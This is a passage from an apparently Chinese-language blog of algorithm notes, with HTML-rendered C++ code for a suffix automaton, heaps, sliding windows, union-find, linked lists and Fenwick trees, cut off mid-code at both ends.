class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; ~i; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(e[i]);</span><br><span class="line">        f[u] += f[e[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f[u] &gt; <span class="number">1</span>)</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, f[u] * node[u].len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)</span><br><span class="line">        <span class="built_in">extend</span>(str[i] - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= tot; i++)</span><br><span class="line">        <span class="built_in">add</span>(node[i].fa, i);</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>);</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆排序</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.插入一个数heap[++size]=x;up(size);</span></span><br><span class="line"><span class="comment">2.求集合中最小值 heap(1);heap从零开始则左右子树不一致，不太方便</span></span><br><span class="line"><span class="comment">3.删除最小值     heapp[1]=heap[size];size--;down(1);	</span></span><br><span class="line"><span class="comment">4.删除任意一个元素 heap[k]=heap[size];size--;down(k)/up(k</span></span><br><span class="line"><span class="comment">5.修改任意一个元素heap(k)=x；down(k)/up(k)</span></span><br><span class="line"><span class="comment">小根堆：每个点都满足小于等于左右两边的son</span></span><br><span class="line"><span class="comment">存储方式：用一个一维数组来存，一号点为根节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> h[N], s,m,n;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> t = u;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t])t = u * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t])t = u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (t != u) &#123;</span><br><span class="line">		<span class="built_in">swap</span>(h[t], h[u]);</span><br><span class="line">		<span class="built_in">down</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u / <span class="number">2</span>] &gt; h[u])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(h[u / <span class="number">2</span>], h[u]);</span><br><span class="line">		u /= <span class="number">2</span>;   </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)cin &gt;&gt; h[i];</span><br><span class="line">	s = n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = n/<span class="number">2</span> ; i; i--)<span class="built_in">down</span>(i);<span class="comment">// 用n/2是为了因为降低时间复杂度，因为最后一层二叉树占接近全部的一半</span></span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		cout &lt;&lt; h[<span class="number">1</span>];</span><br><span class="line">		h[<span class="number">1</span>]=h[s];</span><br><span class="line">		s--;</span><br><span class="line">		<span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="堆模拟"><a href="#堆模拟" class="headerlink" title="堆模拟"></a>堆模拟</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span>  m;</span><br><span class="line"><span class="type">int</span> h[N], ph[N], hp[N], s;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hswap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">swap</span>(ph[hp[a]], ph[hp[b]]);</span><br><span class="line">	<span class="built_in">swap</span>(hp[a], hp[b]);</span><br><span class="line">	<span class="built_in">swap</span>(h[a], h[b]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> t = u;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t])t == u * <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= s &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t])t == u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (u != t) &#123;</span><br><span class="line">		<span class="built_in">hswap</span>(t, u);</span><br><span class="line">		<span class="built_in">down</span>(t);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u / <span class="number">2</span>] &gt; h[u])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">hswap</span>(u / <span class="number">2</span>, u);</span><br><span class="line">		u /= <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n,k,x;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">while</span> (n--) &#123;</span><br><span class="line">		<span class="type">char</span> op[<span class="number">3</span>];</span><br><span class="line">		cin &gt;&gt; op;</span><br><span class="line">		<span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">			cin &gt;&gt; x;</span><br><span class="line">			s++;<span class="comment">//在堆中的位置</span></span><br><span class="line">			m++;<span class="comment">//在次序中的位置</span></span><br><span class="line">			ph[m] = s;</span><br><span class="line">			hp[s] = m;<span class="comment">//两者类似反函数，互相映射</span></span><br><span class="line">			h[s] = x;</span><br><span class="line">			<span class="built_in">up</span>(s);<span class="comment">//最末尾往上up</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;P&#x27;</span> &amp;&amp; op[<span class="number">1</span>] == <span class="string">&#x27;M&#x27;</span>) cout &lt;&lt; h[<span class="number">1</span>];<span class="comment">//输出集合中最小值</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span> &amp;&amp; op[<span class="number">1</span>] == <span class="string">&#x27;M&#x27;</span>) &#123;<span class="comment">//删除集合中最小值</span></span><br><span class="line">			<span class="built_in">hswap</span>(<span class="number">1</span>, s);</span><br><span class="line">			s--;</span><br><span class="line">			<span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span>) &#123;<span class="comment">//删除第k个插入的数</span></span><br><span class="line">			cin &gt;&gt; k;</span><br><span class="line">			k = ph[k];<span class="comment">//新的位置</span></span><br><span class="line">			<span class="built_in">hswap</span>(k, s);</span><br><span class="line">			s--;</span><br><span class="line">			<span class="built_in">down</span>(k), <span class="built_in">up</span>(k);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;<span class="comment">// C  修改第k个插入的数</span></span><br><span class="line">			cin &gt;&gt; k &gt;&gt; x;</span><br><span class="line">			k = ph[k];</span><br><span class="line">			h[k] = x;</span><br><span class="line">			<span class="built_in">down</span>(k), <span class="built_in">up</span>(k);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单调队列之滑动窗口"><a href="#单调队列之滑动窗口" class="headerlink" title="单调队列之滑动窗口"></a>单调队列之滑动窗口</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[N], q[N];<span class="comment">//a[N]表示数的存放集合,q[N]表示数的下标的集合</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> hh = <span class="number">0</span>;<span class="comment">//hh判断队列长度，hh是队尾</span></span><br><span class="line">	<span class="type">int</span> tt = <span class="number">-1</span>;<span class="comment">//tt表示次序，tt是对头</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="comment">//判断对头是否已经滑出窗口</span></span><br><span class="line">		<span class="keyword">while</span> (hh &lt;= tt &amp;&amp; i - k + <span class="number">1</span> &gt; q[hh])hh++;<span class="comment">//while肯定行,但一次肯定是一个出,所以用if也行</span></span><br><span class="line">		<span class="keyword">while</span> (hh &lt;= tt &amp;&amp; a[q[tt]] &gt;= a[i])tt--;<span class="comment">//要构造一个单调递增数列</span></span><br><span class="line">		q[++tt] = i;<span class="comment">//把下标该放的位置</span></span><br><span class="line">		<span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>)cout &lt;&lt; a[q[hh]] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><h3 id="普通并查集"><a href="#普通并查集" class="headerlink" title="普通并查集"></a>普通并查集</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反集,将a和n+b,n+a和b分别合并，种类并查集</span></span><br><span class="line"><span class="comment">//并查集巧妙地利用了递归，每次更新后都会形成新的集合，同时用递归对路迳进行了压缩</span></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> p[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="comment">//返回x的祖宗节点,同时对路径进行压缩</span></span><br><span class="line">	<span class="keyword">if</span> (p[x] != x)p[x] = <span class="built_in">find</span>(p[x]);<span class="comment">//采用递归,找到他的父节点,同时进行了路径压缩,便于优化后面的索</span></span><br><span class="line">	<span class="keyword">return</span> p[x];<span class="comment">//最后求出祖宗节点</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)p[i]=i;<span class="comment">//初始化数组p,使得每个都是其父节点,从i等于1开始</span></span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">		<span class="type">int</span> a, b;</span><br><span class="line">		cin &gt;&gt; op &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		<span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;M&#x27;</span>)p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);<span class="comment">//祖宗节点的父节点为b的祖宗节点,使得a的祖宗节点放在b的祖宗节点下达到合并集合的效果</span></span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">find</span>(a) == <span class="built_in">find</span>(b))cout &lt;&lt; <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">			<span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="size的维护"><a href="#size的维护" class="headerlink" title="size的维护"></a>size的维护</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//p[]存每个点的祖宗节点，size[]只有祖宗节点的有意义，表示祖宗节点所在集合中点的数量</span></span><br><span class="line"><span class="type">int</span> p[N],size[N];</span><br><span class="line"><span class="comment">//返回x的祖宗节点</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p[x]!=x) p[x]=<span class="built_in">find</span>(p[x]);</span><br><span class="line">    <span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化，假定节点编号为1~n</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">    p[i]=i;</span><br><span class="line">    size[i]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//合并a和b所在的两个集合</span></span><br><span class="line">size[<span class="built_in">find</span>(b)]+=size[<span class="built_in">find</span>(a)];</span><br><span class="line">p[<span class="built_in">find</span>(a)]=<span class="built_in">find</span>(b);</span><br></pre></td></tr></table></figure>

<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">const int N = 100010;</span><br><span class="line">//head=头结点,e[i]表示节点i的值,ne【i】表示节点i的next指针,idx表示储存的点的次序</span><br><span class="line">int head, e[N], ne[N], idx;</span><br><span class="line">void init() &#123;</span><br><span class="line">	head = -1;</span><br><span class="line">	idx = 0;</span><br><span class="line">&#125;//对head和idx进行初始化</span><br><span class="line">//将x插到头结点</span><br><span class="line">void addhead(int x) &#123;</span><br><span class="line">	e[idx] = x, ne[idx] = head, head = idx++;</span><br><span class="line">&#125;</span><br><span class="line">void addk(int k,int x) &#123;</span><br><span class="line">	e[idx] = x;</span><br><span class="line">	ne[idx] = ne[k];</span><br><span class="line">	ne[k] = idx;</span><br><span class="line">	idx++;</span><br><span class="line">&#125;//将x插到k后面，和头插法没什么区别</span><br><span class="line">//将下标是k后面的一个点删掉</span><br><span class="line">void remove(int k) &#123;</span><br><span class="line">	ne[k] = ne[ne[k]];//链表是一个递归，可以理解为ne记录的是下一个数据的idx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> m,k,x;</span><br><span class="line"><span class="type">int</span> e[N], l[N], r[N], idx;</span><br><span class="line"><span class="comment">//类似单链表进行初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//0表示左端点，1表示右端点</span></span><br><span class="line">	l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	r[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//r表示从左往右，l表示从右往左</span></span><br><span class="line">	idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在下表是k的右边边插入一个点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addk</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	e[idx] = x;</span><br><span class="line">	r[idx] = r[k];</span><br><span class="line">	l[idx] = k;</span><br><span class="line">	l[r[k]] = idx;</span><br><span class="line">	r[k] = idx;</span><br><span class="line">	idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除第k个点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">	r[l[k]] = r[k];</span><br><span class="line">	l[r[k]] = l[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h2><p>支持功能:快速求前缀和(log(n))+单点修改(log(n))</p>
<p>思路起源:普通数组和前缀和数组分别在修改和查询前缀和有o(1)的效率,但在相反的功能效率都为o(n),对于m次查询,则效率是平方级别的,但使用树状数组能降低复杂度至mlog(n)级别.</p>
<p>思路参考设计:例如一个区间(1~x),把x写成多个2的次幂加和,幂由大到小标号为k,k-1,k-2,…,2,1,通过这k个节点,将1-x分解为k+1个区间,故设立每个区间为(L,R],则其长度一定是R的二进制串的最后一位1对应的次幂.</p>
<p>设C[R]为(L,R]区间的和,则C[R]&#x3D;[R-lowbit(R)+1,R],lowbit函数返回的是最后一个1.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251467.png" alt="image-20240205210052622"></p>
<p>绘画出像这样的树</p>
<p>给定一个x,如何找出其对应的若干个子节点,已知给定的x在二进制下是…10000,则x-1为…01111类似于,则C[x]&#x3D;a[x](a[x]为原数组)+C[x-1]+C[x-1-1]+C[x-1-1-2]+C[x-1-1-2-4].即每次减去一个lowbit,若干个1中每个1都对应了一个儿子(具有唯一性)</p>
<p>对于修改操作,则是每次修改完一个节点则其父节点是p&#x3D;x+lowbit(x),一共的父节点个数少于log(x),只需要便利每个父节点就可以修改完毕,每个节点会直接影响的只有其父节点(具有唯一性)</p>
<h3 id="单点修改-区间查询"><a href="#单点修改-区间查询" class="headerlink" title="单点修改,区间查询"></a><a href="https://www.luogu.com.cn/problem/P3374">单点修改,区间查询</a></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">LL tr[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x ,<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=x;i&lt;=n;i+=<span class="built_in">lowbit</span>(i))tr[i]+=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LL <span class="title">sum</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">   LL res=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=x;i;i-=<span class="built_in">lowbit</span>(i))res+=tr[i];</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(i,a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="type">int</span> t,l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;t,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)<span class="built_in">add</span>(l,r);</span><br><span class="line">        <span class="keyword">else</span>   <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">sum</span>(r)-<span class="built_in">sum</span>(l<span class="number">-1</span>)); </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="区间修改-单点查询"><a href="#区间修改-单点查询" class="headerlink" title="区间修改+单点查询"></a><a href="https://www.luogu.com.cn/problem/P3368">区间修改+单点查询</a></h3><p>差分—&gt;两点修改,区间求和</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">LL tr[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x ,<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=x;i&lt;=n;i+=<span class="built_in">lowbit</span>(i))tr[i]+=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LL <span class="title">sum</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">   LL res=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=x;i;i-=<span class="built_in">lowbit</span>(i))res+=tr[i];</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(i,a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="type">int</span> tag,l,r,c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;tag);</span><br><span class="line">        <span class="keyword">if</span>(tag==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;l,&amp;r,&amp;c);</span><br><span class="line">            <span class="built_in">add</span>(l,c),<span class="built_in">add</span>(r+<span class="number">1</span>,-c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">sum</span>(c));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="区间修改-区间查询"><a href="#区间修改-区间查询" class="headerlink" title="区间修改+区间查询"></a><a href="https://www.luogu.com.cn/problem/P3372">区间修改+区间查询</a></h3><p>用两个差分数组(b[i]和i<em>b[i])来维护区间的修改和查询前缀和(原数组是a[N]),每次只用改四个点,查询则是用下列公式:<br>$$<br>\sum_{1}^{n}a[i]&#x3D;\sum_{1}^{n}b[i]</em>(n+1)-\sum_{1}^{n}(i*b[i])<br>$$<br>便可AC洛谷上的一道线段树模版题</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line">ll tr1[N],tr2[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">ll a[N];</span><br><span class="line">ll l,r;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">sum</span><span class="params">(ll tr[],<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">   ll res=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=x;i&gt;<span class="number">0</span>;i-=<span class="built_in">lowbit</span>(i))res+=tr[i];</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">p_sum</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(tr1,r)*(r+<span class="number">1</span>)-<span class="built_in">sum</span>(tr2,r)-<span class="built_in">sum</span>(tr1,l<span class="number">-1</span>)*l+<span class="built_in">sum</span>(tr2,l<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(ll tr[],<span class="type">int</span> x,ll c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=x;i&lt;=n;i+=<span class="built_in">lowbit</span>(i))tr[i]+=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(tr1,i,a[i]-a[i<span 